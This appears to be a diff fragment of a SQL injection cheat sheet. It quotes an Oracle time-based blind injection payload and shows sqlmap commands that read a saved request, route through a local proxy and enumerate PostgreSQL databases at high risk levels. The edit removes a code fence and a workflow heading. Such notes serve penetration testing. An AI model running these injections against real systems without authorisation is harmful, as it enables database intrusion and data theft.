@@ -172,12 +172,10 @@ SELECT CASE WHEN (1=1) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL E
 **From saved request file:**
 
 ```bash
+
 sqlmap -r ./request.txt --force-ssl --dbms=postgresql --proxy="http://127.0.0.1:8080"
-```
 
-**Workflow  enumerate then dump:**
 
-```bash
 # 1. Find databases
 sqlmap -r request.txt --level 5 --risk 3 --dbms postgresql --technique E --dbs
 
